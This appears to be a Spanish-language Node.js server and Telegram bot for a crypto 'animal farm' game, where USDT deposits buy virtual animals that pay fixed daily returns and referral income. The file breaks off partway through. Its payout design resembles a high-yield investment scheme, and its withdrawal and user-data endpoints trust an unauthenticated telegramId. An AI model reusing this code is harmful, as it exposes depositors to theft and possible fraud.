require('dotenv').config();
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const db = require('./db');
const path = require('path');
const axios = require('axios');
const cron = require('node-cron');
const fs = require('fs');

const app = express();
const port = process.env.PORT || 3000;

// Configuración del bot de Telegram
const token = process.env.TELEGRAM_BOT_TOKEN;
const bot = new TelegramBot(token, { polling: true });
const adminId = 5702506445;
const botUsername = 'Jdjdjejudfuxuwbot';

// Keep-alive mechanism to prevent Glitch from sleeping
const keepAlive = () => {
  setInterval(async () => {
    try {
      await axios.get(`https://${process.env.PROJECT_DOMAIN}.glitch.me/`);
      console.log(`[${new Date().toISOString()}] Keep-alive ping sent`);
    } catch (error) {
      console.error(`[${new Date().toISOString()}] Keep-alive error: ${error.message}`);
    }
  }, 5 * 60 * 1000); // Ping every 5 minutes
};
keepAlive();

// Middleware
app.use(express.json());
app.use(express.static('public'));

// Ruta para la web app
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Migración para corregir telegram_id en la base de datos
db.serialize(() => {
  console.log(`[${new Date().toISOString()}] Running migration to fix telegram_id values`);
  db.run(`
    UPDATE users 
    SET telegram_id = TRIM(telegram_id, '.0')
    WHERE telegram_id LIKE '%.0'
  `, (err) => {
    if (err) {
      console.error(`[${new Date().toISOString()}] Migration error: ${err.message}`);
    } else {
      console.log(`[${new Date().toISOString()}] Migration completed successfully`);
    }
  });
});

// Función para agregar ganancias diarias a todos los usuarios
function addDailyEarnings() {
  console.log(`[${new Date().toISOString()}] Starting daily earnings distribution`);
  
  db.all('SELECT id FROM users', [], (err, users) => {
    if (err) {
      console.error(`[${new Date().toISOString()}] Error fetching users: ${err.message}`);
      return;
    }
    
    users.forEach(user => {
      db.all(`
        SELECT type, SUM(quantity) as total
        FROM animals 
        WHERE user_id = ? AND expiry_date > datetime('now')
        GROUP BY type
      `, [user.id], (err, animals) => {
        if (err) {
          console.error(`[${new Date().toISOString()}] Error fetching animals for user ${user.id}: ${err.message}`);
          return;
        }
        
        let totalEarnings = 0;
        const animalCounts = { eggs: 0, chickens: 0, hens: 0, roosters: 0, turkeys: 0 };
        
        animals.forEach(animal => {
          animalCounts[animal.type] = animal.total;
          
          switch(animal.type) {
            case 'eggs':
              totalEarnings += animal.total * 5 * 0.043;
              break;
            case 'chickens':
              totalEarnings += animal.total * 25 * 0.052;
              break;
            case 'hens':
              totalEarnings += animal.total * 70 * 0.061;
              break;
            case 'roosters':
              totalEarnings += animal.total * 99 * 0.075;
              break;
            case 'turkeys':
              totalEarnings += animal.total * 1.0; // $1 daily income per turkey
              break;
          }
        });
        
        db.get('SELECT daily_referral_income FROM users WHERE id = ?', [user.id], (err, result) => {
          if (err) {
            console.error(`[${new Date().toISOString()}] Error fetching daily_referral_income: ${err.message}`);
            return;
          }
          totalEarnings += result.daily_referral_income || 0;
          
          if (totalEarnings > 0) {
            db.run('UPDATE users SET balance = balance + ? WHERE id = ?', [totalEarnings, user.id], (err) => {
              if (err) {
                console.error(`[${new Date().toISOString()}] Error updating balance for user ${user.id}: ${err.message}`);
                return;
              }
              
              db.run(`
                INSERT INTO transactions (user_id, amount, type, status)
                VALUES (?, ?, 'earning', 'approved')
              `, [user.id, totalEarnings], (err) => {
                if (err) console.error(`[${new Date().toISOString()}] Error recording earnings transaction: ${err.message}`);
              });
              
              console.log(`[${new Date().toISOString()}] Added $${totalEarnings.toFixed(2)} to user ${user.id}`);
            });
          }
        });
      });
    });
  });
}

// Actualizar ganancias por referidos
function updateReferralEarnings() {
  console.log(`[${new Date().toISOString()}] Updating referral earnings`);
  
  db.all('SELECT id, referral_count FROM users', [], (err, users) => {
    if (err) {
      console.error(`[${new Date().toISOString()}] Error fetching users for referral update: ${err.message}`);
      return;
    }
    
    users.forEach(user => {
      const referralIncome = Math.min((user.referral_count / 10) * 0.01, 1.00);
      
      db.run(`
        UPDATE users 
        SET daily_referral_income = ? 
        WHERE id = ?
      `, [referralIncome, user.id], (err) => {
        if (err) {
          console.error(`[${new Date().toISOString()}] Error updating referral income for user ${user.id}: ${err.message}`);
        } else {
          console.log(`[${new Date().toISOString()}] Set referral income to $${referralIncome.toFixed(2)} for user ${user.id}`);
        }
      });
    });
  });
}

// Programar la tarea diaria a las 00:00 UTC
cron.schedule('0 0 * * *', () => {
  console.log(`[${new Date().toISOString()}] Running scheduled daily earnings`);
  addDailyEarnings();
});

// Programar actualización de ganancias por referidos (cada hora)
cron.schedule('0 * * * *', () => {
  updateReferralEarnings();
});

// Limpiar animales expirados
cron.schedule('0 0 * * *', () => {
  console.log(`[${new Date().toISOString()}] Cleaning up expired animals`);
  db.run(`
    DELETE FROM animals 
    WHERE expiry_date <= datetime('now')
  `, (err) => {
    if (err) {
      console.error(`[${new Date().toISOString()}] Error cleaning up expired animals: ${err.message}`);
    } else {
      console.log(`[${new Date().toISOString()}] Expired animals cleaned up successfully`);
    }
  });
});

// API para obtener datos del usuario
app.get('/api/user/:telegramId', (req, res) => {
  const telegramId = String(req.params.telegramId);
  console.log(`[${new Date().toISOString()}] Requesting user data for telegramId: ${telegramId}`);
  
  const fetchUserData = (attempt = 1) => {
    db.get('SELECT * FROM users WHERE telegram_id = ? OR telegram_id = ?', [telegramId, telegramId + '.0'], (err, user) => {
      if (err) {
        console.error(`[${new Date().toISOString()}] Database error: ${err.message}`);
        return res.status(500).json({error: 'Error interno del servidor'});
      }
      if (!user) {
        console.log(`[${new Date().toISOString()}] User not found for telegramId: ${telegramId}, attempt ${attempt}`);
        if (attempt < 3) {
          setTimeout(() => fetchUserData(attempt + 1), 1000);
          return;
        }
        return res.status(404).json({error: 'User not found'});
      }
      
      if (user.banned) {
        return res.status(403).json({error: 'User is banned'});
      }
      
      console.log(`[${new Date().toISOString()}] User found: ${JSON.stringify(user)}`);
      
      db.all(`
        SELECT type, quantity, purchase_date, expiry_date
        FROM animals 
        WHERE user_id = ? AND expiry_date > datetime('now')
      `, [user.id], (err, animals) => {
        if (err) {
          console.error(`[${new Date().toISOString()}] Database error fetching animals: ${err.message}`);
          return res.status(500).json({error: 'Error interno del servidor'});
        }
        
        const animalCounts = { eggs: 0, chickens: 0, hens: 0, roosters: 0, turkeys: 0 };
        animals.forEach(animal => {
          animalCounts[animal.type] += animal.quantity;
        });
        
        const dailyIncome = (animalCounts.eggs * 5 * 0.043) + 
                           (animalCounts.chickens * 25 * 0.052) + 
                           (animalCounts.hens * 70 * 0.061) + 
                           (animalCounts.roosters * 99 * 0.075) +
                           (animalCounts.turkeys * 1.0) +
                           (user.daily_referral_income || 0);
        
        db.get('SELECT COUNT(*) as referral_count FROM referrals WHERE referrer_id = ?', [user.id], (err, referralResult) => {
          if (err) {
            console.error(`[${new Date().toISOString()}] Database error fetching referral count: ${err.message}`);
            return res.status(500).json({error: 'Error interno del servidor'});
          }
          
          db.get('SELECT SUM(earned) as referral_earnings FROM referrals WHERE referrer_id = ?', [user.id], (err, earningsResult) => {
            if (err) {
              console.error(`[${new Date().toISOString()}] Database error fetching referral earnings: ${err.message}`);
              return res.status(500).json({error: 'Error interno del servidor'});
            }
            
            const responseData = {
              ...user,
              animals: animalCounts,
              animal_details: animals,
              referral_count: referralResult.referral_count || 0,
              referral_earnings: earningsResult.referral_earnings || 0,
              daily_income: dailyIncome
            };
            
            console.log(`[${new Date().toISOString()}] Sending user data: ${JSON.stringify(responseData)}`);
            res.json(responseData);
          });
        });
      });
    });
  };
  
  fetchUserData();
});

// API para obtener transacciones
app.get('/api/transactions/:telegramId', (req, res) => {
  const telegramId = String(req.params.telegramId);
  
  db.get('SELECT id, banned FROM users WHERE telegram_id = ?', [telegramId], (err, user) => {
    if (err) return res.status(500).json({error: err.message});
    if (!user) return res.status(404).json({error: 'User not found'});
    if (user.banned) return res.status(403).json({error: 'User is banned'});
    
    db.all(`
      SELECT * FROM transactions 
      WHERE user_id = ?
      ORDER BY created_at DESC
      LIMIT 50
    `, [user.id], (err, transactions) => {
      if (err) return res.status(500).json({error: err.message});
      res.json(transactions);
    });
  });
});

// API para manejar depósitos
app.post('/api/deposit', (req, res) => {
  const { telegramId, amount, network } = req.body;
  const telegramIdStr = String(telegramId);
  
  if (amount < 5) return res.status(400).json({error: 'Minimum deposit is 5 USDT'});
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramIdStr], (err, user) => {
    if (err) return res.status(500).json({error: err.message});
    if (!user) return res.status(404).json({error: 'User not found'});
    if (user.banned) return res.status(403).json({error: 'User is banned'});
    
    db.run(`
      INSERT INTO transactions (user_id, amount, type, status, network)
      VALUES (?, ?, 'deposit', 'pending', ?)
    `, [user.id, amount, network], function(err) {
      if (err) return res.status(500).json({error: err.message});
      
      const message = `📥 Nuevo depósito\n\nUsuario: ${user.first_name} ${user.last_name}\nID: ${user.telegram_id}\n@${user.username}\nCantidad: ${amount} USDT\nRed: ${network}\n\nID Transacción: ${this.lastID}`;
      
      bot.sendMessage(adminId, message, {
        reply_markup: {
          inline_keyboard: [
            [{text: '✅ Aprobar', callback_data: `approve_deposit_${this.lastID}`}],
            [{text: '❌ Rechazar', callback_data: `reject_deposit_${this.lastID}`}]
          ]
        }
      });
      
      res.json({success: true, transactionId: this.lastID});
    });
  });
});

// API para manejar retiros
app.post('/api/withdraw', (req, res) => {
  const { telegramId, amount, walletAddress, network } = req.body;
  const telegramIdStr = String(telegramId);
  
  if (amount < 1) return res.status(400).json({error: 'Minimum withdrawal is 1 USDT'});
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramIdStr], (err, user) => {
    if (err) return res.status(500).json({error: err.message});
    if (!user) return res.status(404).json({error: 'User not found'});
    if (user.banned) return res.status(403).json({error: 'User is banned'});
    if (user.balance < amount) return res.status(400).json({error: 'Insufficient balance'});
    
    db.get(`
      SELECT SUM(amount) as total_deposits
      FROM transactions 
      WHERE user_id = ? AND type = 'deposit' AND status = 'approved'
    `, [user.id], (err, result) => {
      if (err) return res.status(500).json({error: err.message});
      const totalDeposits = result.total_deposits || 0;
      if (totalDeposits < 5) {
        return res.status(400).json({error: 'Debes depositar al menos 5 USDT para poder retirar'});
      }
      
      db.get(`
        SELECT * FROM transactions 
        WHERE user_id = ? AND type = 'withdrawal' AND status = 'pending'
      `, [user.id], (err, pendingWithdrawal) => {
        if (err) return res.status(500).json({error: err.message});
        if (pendingWithdrawal) return res.status(400).json({error: 'Ya tienes un retiro pendiente'});
        
        db.run(`
          INSERT INTO transactions (user_id, amount, type, status, wallet_address, network)
          VALUES (?, ?, 'withdrawal', 'pending', ?, ?)
        `, [user.id, amount, walletAddress, network], function(err) {
          if (err) return res.status(500).json({error: err.message});
          
          db.run('UPDATE users SET balance = balance - ? WHERE id = ?', [amount, user.id]);
          
          const message = `📤 Nuevo retiro\n\nUsuario: ${user.first_name} ${user.last_name}\nID: ${user.telegram_id}\n@${user.username}\nCantidad: ${amount} USDT\nWallet: ${walletAddress}\nRed: ${network}\n\nID Transacción: ${this.lastID}`;
          
          bot.sendMessage(adminId, message, {
            reply_markup: {
              inline_keyboard: [
                [{text: '✅ Aprobar', callback_data: `approve_withdrawal_${this.lastID}`}],
                [{text: '❌ Rechazar', callback_data: `reject_withdrawal_${this.lastID}`}]
              ]
            }
          });
          
          res.json({success: true, transactionId: this.lastID});
        });
      });
    });
  });
});

// API para manejar compras de animales y combos
app.post('/api/purchase', (req, res) => {
  const { telegramId, animal, quantity, isCombo } = req.body;
  const telegramIdStr = String(telegramId);
  
  const prices = { eggs: 5, chickens: 25, hens: 70, roosters: 99, turkeys: 6, combo: 35 };
  const durations = { eggs: 28, chickens: 25, hens: 22, roosters: 20, turkeys: 10, combo: { eggs: 28, chickens: 25 } };
  
  if (!prices[animal] && !isCombo) return res.status(400).json({error: 'Animal o combo inválido'});
  if (!Number.isInteger(quantity) || quantity < 1) return res.status(400).json({error: 'Cantidad inválida'});
  
  const cost = isCombo ? prices.combo : prices[animal] * quantity;
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramIdStr], (err, user) => {
    if (err) return res.status(500).json({error: err.message});
    if (!user) return res.status(404).json({error: 'User not found'});
    if (user.banned) return res.status(403).json({error: 'User is banned'});
    
    db.all(`
      SELECT type, SUM(quantity) as total
      FROM animals 
      WHERE user_id = ? AND expiry_date > datetime('now')
      GROUP BY type
    `, [user.id], (err, animals) => {
      if (err) return res.status(500).json({error: err.message});
      
      const animalCounts = { eggs: 0, chickens: 0, hens: 0, roosters: 0, turkeys: 0 };
      animals.forEach(a => animalCounts[a.type] = a.total);
      
      if (isCombo) {
        if (animalCounts.eggs + 3 > 50 || animalCounts.chickens + 1 > 50) {
          return res.status(400).json({error: 'Límite máximo de 50 huevos o pollos alcanzado'});
        }
      } else {
        if (animalCounts[animal] + quantity > 50) {
          return res.status(400).json({error: `Límite máximo de 50 ${animal} alcanzado`});
        }
      }
      
      if (user.balance < cost) return res.status(400).json({error: 'Saldo insuficiente'});
      
      const insertAnimal = (type, qty, duration) => {
        const expiryDate = new Date();
        expiryDate.setDate(expiryDate.getDate() + duration);
        
        db.run(`
          INSERT INTO animals (user_id, type, quantity, expiry_date)
          VALUES (?, ?, ?, ?)
        `, [user.id, type, qty, expiryDate.toISOString()], (err) => {
          if (err) console.error(`[${new Date().toISOString()}] Error inserting animal: ${err.message}`);
        });
      };
      
      if (isCombo) {
        insertAnimal('eggs', 3, durations.combo.eggs);
        insertAnimal('chickens', 1, durations.combo.chickens);
      } else {
        insertAnimal(animal, quantity, durations[animal]);
      }
      
      db.run(`
        UPDATE users 
        SET balance = balance - ?
        WHERE telegram_id = ?
      `, [cost, telegramIdStr], function(err) {
        if (err) return res.status(500).json({error: err.message});
        
        db.run(`
          INSERT INTO transactions (user_id, amount, type, status)
          VALUES (?, ?, 'purchase', 'approved')
        `, [user.id, cost], function(err) {
          if (err) console.error(err);
          
          const message = isCombo ? 'Compra de combo (3 huevos + 1 pollo) exitosa' : `Compra de ${quantity} ${animal} exitosa`;
          res.json({success: true, message});
        });
      });
    });
  });
});

// Comandos del bot de Telegram
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const username = msg.from.username || '';
  const firstName = msg.from.first_name || '';
  const lastName = msg.from.last_name || '';
  const referralCode = msg.text.split(' ')[1] || null;
  
  console.log(`[${new Date().toISOString()}] /start command received for userId: ${userId}, username: ${username}, referralCode: ${referralCode}`);
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [userId], (err, user) => {
    if (err) {
      console.error(`[${new Date().toISOString()}] Database error during user lookup: ${err.message}`);
      return bot.sendMessage(chatId, 'Ocurrió un error al registrar tu usuario. Por favor, intenta nuevamente.');
    }
    
    if (user && user.banned) {
      return bot.sendMessage(chatId, '🚫 Tu cuenta está baneada. Contacta al soporte para más información.');
    }
    
    if (user) {
      console.log(`[${new Date().toISOString()}] User already exists: ${JSON.stringify(user)}`);
      sendWelcomeMessage(chatId, firstName, userId);
      return;
    }
    
    const newReferralCode = generateReferralCode();
    console.log(`[${new Date().toISOString()}] Generated new referral code: ${newReferralCode}`);
    
    db.run(`
      INSERT INTO users (telegram_id, username, first_name, last_name, referral_code)
      VALUES (?, ?, ?, ?, ?)
    `, [userId, username, firstName, lastName, newReferralCode], function(err) {
      if (err) {
        console.error(`[${new Date().toISOString()}] Error inserting new user: ${err.message}`);
        return bot.sendMessage(chatId, 'Error al registrar usuario. Por favor, intenta de nuevo.');
      }
      
      const newUserId = this.lastID;
      console.log(`[${new Date().toISOString()}] New user registered successfully: ${userId}, referral_code: ${newReferralCode}, newUserId: ${newUserId}`);
      
      // Dar 1 huevo al nuevo usuario
      const durations = { eggs: 28 };
      const eggExpiryDate = new Date();
      eggExpiryDate.setDate(eggExpiryDate.getDate() + durations.eggs);
      db.run(`
        INSERT INTO animals (user_id, type, quantity, expiry_date)
        VALUES (?, 'eggs', 1, ?)
      `, [newUserId, eggExpiryDate.toISOString()], (err) => {
        if (err) {
          console.error(`[${new Date().toISOString()}] Error granting egg to new user: ${err.message}`);
        } else {
          console.log(`[${new Date().toISOString()}] Granted 1 egg to new user ${userId}`);
        }
      });
      
      if (referralCode) {
        console.log(`[${new Date().toISOString()}] Processing referral for code: ${referralCode}`);
        db.get('SELECT id, telegram_id FROM users WHERE referral_code = ?', [referralCode], (err, referrer) => {
          if (err) {
            console.error(`[${new Date().toISOString()}] Error finding referrer: ${err.message}`);
            return;
          }
          if (!referrer) {
            console.log(`[${new Date().toISOString()}] Referrer not found for code: ${referralCode}`);
            sendWelcomeMessage(chatId, firstName, userId);
            return;
          }
          
          db.get(`
            SELECT COUNT(*) as referral_count
            FROM referrals 
            WHERE referrer_id = ?
          `, [referrer.id], (err, result) => {
            if (err) {
              console.error(`[${new Date().toISOString()}] Error counting referrals: ${err.message}`);
              return;
            }
            
            db.run(`
              INSERT INTO referrals (referrer_id, referred_id)
              VALUES (?, ?)
            `, [referrer.id, newUserId], (err) => {
              if (err) {
                console.error(`[${new Date().toISOString()}] Error inserting referral: ${err.message}`);
                return;
              }
              
              db.run('UPDATE users SET referred_by = ? WHERE id = ?', [referrer.id, newUserId], (err) => {
                if (err) {
                  console.error(`[${new Date().toISOString()}] Error updating referred_by: ${err.message}`);
                  return;
                }
                
                db.get(`
                  SELECT COUNT(*) as referral_count
                  FROM referrals 
                  WHERE referrer_id = ?
                `, [referrer.id], (err, result) => {
                  if (err) {
                    console.error(`[${new Date().toISOString()}] Error counting referrals after insert: ${err.message}`);
                    return;
                  }
                  const referralCount = result.referral_count;
                  console.log(`[${new Date().toISOString()}] Referrer now has ${referralCount} referrals`);
                  
                  const referralIncome = Math.min((referralCount / 10) * 0.01, 1.00);
                  db.run(`
                    UPDATE users 
                    SET referral_count = ?, daily_referral_income = ? 
                    WHERE id = ?
                  `, [referralCount, referralIncome, referrer.id], (err) => {
                    if (err) {
                      console.error(`[${new Date().toISOString()}] Error updating referrer referral count and income: ${err.message}`);
                      return;
                    }
                    bot.sendMessage(referrer.telegram_id, `🎉 ¡Nuevo referido! Ahora tienes ${referralCount} referidos. Tu ingreso diario por referidos es ahora $${referralIncome.toFixed(2)}.`);
                  });
                });
              });
            });
            sendWelcomeMessage(chatId, firstName, userId);
          });
        });
      } else {
        sendWelcomeMessage(chatId, firstName, userId);
      }
    });
  });
});

// Admin commands
bot.onText(/\/addbalance\s+(\d+\.?\d*)\s+(\d+)/, (msg, match) => {
  if (msg.from.id !== adminId) return;
  const amount = parseFloat(match[1]);
  const telegramId = match[2];
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramId], (err, user) => {
    if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    if (!user) return bot.sendMessage(msg.chat.id, 'Usuario no encontrado.');
    if (user.banned) return bot.sendMessage(msg.chat.id, 'El usuario está baneado.');
    
    db.run('UPDATE users SET balance = balance + ? WHERE telegram_id = ?', [amount, telegramId], (err) => {
      if (err) return bot.sendMessage(msg.chat.id, 'Error al actualizar el balance.');
      bot.sendMessage(msg.chat.id, `Se añadieron $${amount} al balance del usuario ${telegramId}.`);
      bot.sendMessage(telegramId, `✅ El administrador ha añadido $${amount} a tu balance.`);
    });
  });
});

bot.onText(/\/quitbalance\s+(\d+\.?\d*)\s+(\d+)/, (msg, match) => {
  if (msg.from.id !== adminId) return;
  const amount = parseFloat(match[1]);
  const telegramId = match[2];
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramId], (err, user) => {
    if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    if (!user) return bot.sendMessage(msg.chat.id, 'Usuario no encontrado.');
    if (user.banned) return bot.sendMessage(msg.chat.id, 'El usuario está baneado.');
    if (user.balance < amount) return bot.sendMessage(msg.chat.id, 'Saldo insuficiente.');
    
    db.run('UPDATE users SET balance = balance - ? WHERE telegram_id = ?', [amount, telegramId], (err) => {
      if (err) return bot.sendMessage(msg.chat.id, 'Error al actualizar el balance.');
      bot.sendMessage(msg.chat.id, `Se quitaron $${amount} del balance del usuario ${telegramId}.`);
      bot.sendMessage(telegramId, `⚠️ El administrador ha retirado $${amount} de tu balance.`);
    });
  });
});

bot.onText(/\/addegg\s+(\d+)\s+(\d+)/, (msg, match) => {
  if (msg.from.id !== adminId) return;
  const quantity = parseInt(match[1]);
  const telegramId = match[2];
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramId], (err, user) => {
    if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    if (!user) return bot.sendMessage(msg.chat.id, 'Usuario no encontrado.');
    if (user.banned) return bot.sendMessage(msg.chat.id, 'El usuario está baneado.');
    
    db.all(`
      SELECT SUM(quantity) as total
      FROM animals 
      WHERE user_id = ? AND type = 'eggs' AND expiry_date > datetime('now')
    `, [user.id], (err, result) => {
      if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
      const currentCount = result[0]?.total || 0;
      if (currentCount + quantity > 50) return bot.sendMessage(msg.chat.id, 'Límite máximo de 50 huevos alcanzado.');
      
      const expiryDate = new Date();
      expiryDate.setDate(expiryDate.getDate() + 28);
      
      db.run(`
        INSERT INTO animals (user_id, type, quantity, expiry_date)
        VALUES (?, 'eggs', ?, ?)
      `, [user.id, quantity, expiryDate.toISOString()], (err) => {
        if (err) return bot.sendMessage(msg.chat.id, 'Error al añadir huevos.');
        bot.sendMessage(msg.chat.id, `Se añadieron ${quantity} huevos al usuario ${telegramId}.`);
        bot.sendMessage(telegramId, `✅ El administrador ha añadido ${quantity} huevos a tu cuenta.`);
      });
    });
  });
});

bot.onText(/\/addchicken\s+(\d+)\s+(\d+)/, (msg, match) => {
  if (msg.from.id !== adminId) return;
  const quantity = parseInt(match[1]);
  const telegramId = match[2];
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramId], (err, user) => {
    if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    if (!user) return bot.sendMessage(msg.chat.id, 'Usuario no encontrado.');
    if (user.banned) return bot.sendMessage(msg.chat.id, 'El usuario está baneado.');
    
    db.all(`
      SELECT SUM(quantity) as total
      FROM animals 
      WHERE user_id = ? AND type = 'chickens' AND expiry_date > datetime('now')
    `, [user.id], (err, result) => {
      if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
      const currentCount = result[0]?.total || 0;
      if (currentCount + quantity > 50) return bot.sendMessage(msg.chat.id, 'Límite máximo de 50 pollos alcanzado.');
      
      const expiryDate = new Date();
      expiryDate.setDate(expiryDate.getDate() + 25);
      
      db.run(`
        INSERT INTO animals (user_id, type, quantity, expiry_date)
        VALUES (?, 'chickens', ?, ?)
      `, [user.id, quantity, expiryDate.toISOString()], (err) => {
        if (err) return bot.sendMessage(msg.chat.id, 'Error al añadir pollos.');
        bot.sendMessage(msg.chat.id, `Se añadieron ${quantity} pollos al usuario ${telegramId}.`);
        bot.sendMessage(telegramId, `✅ El administrador ha añadido ${quantity} pollos a tu cuenta.`);
      });
    });
  });
});

bot.onText(/\/addhen\s+(\d+)\s+(\d+)/, (msg, match) => {
  if (msg.from.id !== adminId) return;
  const quantity = parseInt(match[1]);
  const telegramId = match[2];
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramId], (err, user) => {
    if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    if (!user) return bot.sendMessage(msg.chat.id, 'Usuario no encontrado.');
    if (user.banned) return bot.sendMessage(msg.chat.id, 'El usuario está baneado.');
    
    db.all(`
      SELECT SUM(quantity) as total
      FROM animals 
      WHERE user_id = ? AND type = 'hens' AND expiry_date > datetime('now')
    `, [user.id], (err, result) => {
      if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
      const currentCount = result[0]?.total || 0;
      if (currentCount + quantity > 50) return bot.sendMessage(msg.chat.id, 'Límite máximo de 50 gallinas alcanzado.');
      
      const expiryDate = new Date();
      expiryDate.setDate(expiryDate.getDate() + 22);
      
      db.run(`
        INSERT INTO animals (user_id, type, quantity, expiry_date)
        VALUES (?, 'hens', ?, ?)
      `, [user.id, quantity, expiryDate.toISOString()], (err) => {
        if (err) return bot.sendMessage(msg.chat.id, 'Error al añadir gallinas.');
        bot.sendMessage(msg.chat.id, `Se añadieron ${quantity} gallinas al usuario ${telegramId}.`);
        bot.sendMessage(telegramId, `✅ El administrador ha añadido ${quantity} gallinas a tu cuenta.`);
      });
    });
  });
});

bot.onText(/\/addrooster\s+(\d+)\s+(\d+)/, (msg, match) => {
  if (msg.from.id !== adminId) return;
  const quantity = parseInt(match[1]);
  const telegramId = match[2];
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramId], (err, user) => {
    if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    if (!user) return bot.sendMessage(msg.chat.id, 'Usuario no encontrado.');
    if (user.banned) return bot.sendMessage(msg.chat.id, 'El usuario está baneado.');
    
    db.all(`
      SELECT SUM(quantity) as total
      FROM animals 
      WHERE user_id = ? AND type = 'roosters' AND expiry_date > datetime('now')
    `, [user.id], (err, result) => {
      if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
      const currentCount = result[0]?.total || 0;
      if (currentCount + quantity > 50) return bot.sendMessage(msg.chat.id, 'Límite máximo de 50 gallos alcanzado.');
      
      const expiryDate = new Date();
      expiryDate.setDate(expiryDate.getDate() + 20);
      
      db.run(`
        INSERT INTO animals (user_id, type, quantity, expiry_date)
        VALUES (?, 'roosters', ?, ?)
      `, [user.id, quantity, expiryDate.toISOString()], (err) => {
        if (err) return bot.sendMessage(msg.chat.id, 'Error al añadir gallos.');
        bot.sendMessage(msg.chat.id, `Se añadieron ${quantity} gallos al usuario ${telegramId}.`);
        bot.sendMessage(telegramId, `✅ El administrador ha añadido ${quantity} gallos a tu cuenta.`);
      });
    });
  });
});

bot.onText(/\/addturkey\s+(\d+)\s+(\d+)/, (msg, match) => {
  if (msg.from.id !== adminId) return;
  const quantity = parseInt(match[1]);
  const telegramId = match[2];
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramId], (err, user) => {
    if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    if (!user) return bot.sendMessage(msg.chat.id, 'Usuario no encontrado.');
    if (user.banned) return bot.sendMessage(msg.chat.id, 'El usuario está baneado.');
    
    db.all(`
      SELECT SUM(quantity) as total
      FROM animals 
      WHERE user_id = ? AND type = 'turkeys' AND expiry_date > datetime('now')
    `, [user.id], (err, result) => {
      if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
      const currentCount = result[0]?.total || 0;
      if (currentCount + quantity > 50) return bot.sendMessage(msg.chat.id, 'Límite máximo de 50 pavos alcanzado.');
      
      const expiryDate = new Date();
      expiryDate.setDate(expiryDate.getDate() + 10);
      
      db.run(`
        INSERT INTO animals (user_id, type, quantity, expiry_date)
        VALUES (?, 'turkeys', ?, ?)
      `, [user.id, quantity, expiryDate.toISOString()], (err) => {
        if (err) return bot.sendMessage(msg.chat.id, 'Error al añadir pavos.');
        bot.sendMessage(msg.chat.id, `Se añadieron ${quantity} pavos al usuario ${telegramId}.`);
        bot.sendMessage(telegramId, `✅ El administrador ha añadido ${quantity} pavos a tu cuenta.`);
      });
    });
  });
});

bot.onText(/\/quitegg\s+(\d+)\s+(\d+)/, (msg, match) => {
  if (msg.from.id !== adminId) return;
  const quantity = parseInt(match[1]);
  const telegramId = match[2];
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramId], (err, user) => {
    if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    if (!user) return bot.sendMessage(msg.chat.id, 'Usuario no encontrado.');
    if (user.banned) return bot.sendMessage(msg.chat.id, 'El usuario está baneado.');
    
    db.all(`
      SELECT SUM(quantity) as total
      FROM animals 
      WHERE user_id = ? AND type = 'eggs' AND expiry_date > datetime('now')
    `, [user.id], (err, result) => {
      if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
      const currentCount = result[0]?.total || 0;
      if (currentCount < quantity) return bot.sendMessage(msg.chat.id, 'No hay suficientes huevos para quitar.');
      
      db.run(`
        UPDATE animals 
        SET quantity = quantity - ? 
        WHERE user_id = ? AND type = 'eggs' AND expiry_date > datetime('now')
      `, [quantity, user.id], (err) => {
        if (err) return bot.sendMessage(msg.chat.id, 'Error al quitar huevos.');
        bot.sendMessage(msg.chat.id, `Se quitaron ${quantity} huevos del usuario ${telegramId}.`);
        bot.sendMessage(telegramId, `⚠️ El administrador ha retirado ${quantity} huevos de tu cuenta.`);
      });
    });
  });
});

bot.onText(/\/quitchicken\s+(\d+)\s+(\d+)/, (msg, match) => {
  if (msg.from.id !== adminId) return;
  const quantity = parseInt(match[1]);
  const telegramId = match[2];
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramId], (err, user) => {
    if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    if (!user) return bot.sendMessage(msg.chat.id, 'Usuario no encontrado.');
    if (user.banned) return bot.sendMessage(msg.chat.id, 'El usuario está baneado.');
    
    db.all(`
      SELECT SUM(quantity) as total
      FROM animals 
      WHERE user_id = ? AND type = 'chickens' AND expiry_date > datetime('now')
    `, [user.id], (err, result) => {
      if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
      const currentCount = result[0]?.total || 0;
      if (currentCount < quantity) return bot.sendMessage(msg.chat.id, 'No hay suficientes pollos para quitar.');
      
      db.run(`
        UPDATE animals 
        SET quantity = quantity - ? 
        WHERE user_id = ? AND type = 'chickens' AND expiry_date > datetime('now')
      `, [quantity, user.id], (err) => {
        if (err) return bot.sendMessage(msg.chat.id, 'Error al quitar pollos.');
        bot.sendMessage(msg.chat.id, `Se quitaron ${quantity} pollos del usuario ${telegramId}.`);
